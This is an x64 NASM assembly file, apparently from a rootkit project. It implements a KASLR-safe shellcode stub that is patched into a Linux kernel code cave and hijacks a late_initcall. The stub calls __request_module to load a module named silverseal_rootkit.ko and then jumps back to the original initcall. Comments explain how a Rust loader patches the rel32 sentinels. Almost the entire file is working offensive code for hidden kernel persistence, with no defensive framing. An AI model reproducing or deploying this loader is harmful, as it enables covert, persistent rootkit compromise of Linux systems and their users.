; lkm_loader.asm
; Position-independent x64 shellcode executed as a Linux kernel late_initcall.
; Calls __request_module(true, "/silverseal_rootkit.ko"), then tail-calls the
; original displaced initcall.
;
; All kernel addresses are encoded as PC-relative rel32 offsets — no absolute
; pointers — making this blob KASLR-safe. The Rust loader scans for 4-byte
; sentinel values and patches them with the correct relative offsets before
; writing the blob into the kernel .data code cave.
;
; Assemble (flat binary):
;   nasm -f bin -o lkm_loader.bin lkm_loader.asm
;
; Blob layout (offsets from blob start):
;   [code]          variable
;   [path_buffer]   256 bytes — "/silverseal_rootkit.ko\0" + zero padding
;
; Sentinels (patched as i32 PC-relative offsets by Rust before writing blob):
;   REQUEST_MODULE_REL_SENTINEL  0xDDEEFF00  rel32 in call __request_module
;   ORIGINAL_FN_REL_SENTINEL     0x12345678  rel32 in jmp  original_initcall
;
; Debug: emits 'S', 'M', 'J' on COM1 (0x3F8) at entry, after __request_module,
;        and before tail-call respectively.

BITS 64
default rel

; ── COM1 serial helper macro ─────────────────────────────────────────────────
; Emits a single ASCII byte on COM1 (port 0x3F8). Clobbers dx and al only.
%macro SERIAL_CHAR 1
    mov     dx, 0x3F8
    mov     al, %1
    out     dx, al
%endmacro

; ── Entry point ──────────────────────────────────────────────────────────────
; Calling convention: Linux x86-64 System V ABI
; On entry:  rsp % 16 == 8  (caller pushed return addr onto aligned stack)
; After one push: rsp % 16 == 0 (16-byte aligned before the call)

lkm_loader:
    push    rbp                     ; rsp: 8 → 0 (aligned for call below)

    SERIAL_CHAR 'S'                 ; checkpoint: Shellcode entry reached

    mov     edi, 1                  ; arg1: wait = true
    lea     rsi, [path_buffer]      ; arg2: fmt = "/silverseal_rootkit.ko" (RIP-relative)
    xor     eax, eax                ; al = 0 (variadic: no vector register args)

    ; Call __request_module(1, "/silverseal_rootkit.ko") — direct rel32.
    ; rel32 patched by Rust: request_module_virt - (loader_cave_virt + off + 4)
    db      0xE8                    ; CALL rel32
    dd      0xDDEEFF00              ; REQUEST_MODULE_REL_SENTINEL
                                    ; return value intentionally discarded

    SERIAL_CHAR 'M'                 ; checkpoint: __request_module returned

    pop     rbp

    SERIAL_CHAR 'J'                 ; checkpoint: about to tail-call original

    ; Tail-call original initcall — direct rel32 jmp.
    ; rel32 patched by Rust: original_target_virt - (loader_cave_virt + off + 4)
    db      0xE9                    ; JMP rel32
    dd      0x12345678              ; ORIGINAL_FN_REL_SENTINEL
                                    ; eax propagated straight to the framework

; ── Path buffer: 256 bytes total ──────────────────────────────────────────────
path_buffer:
    db      "/silverseal_rootkit.ko", 0
    times   (256 - ($ - path_buffer)) db 0
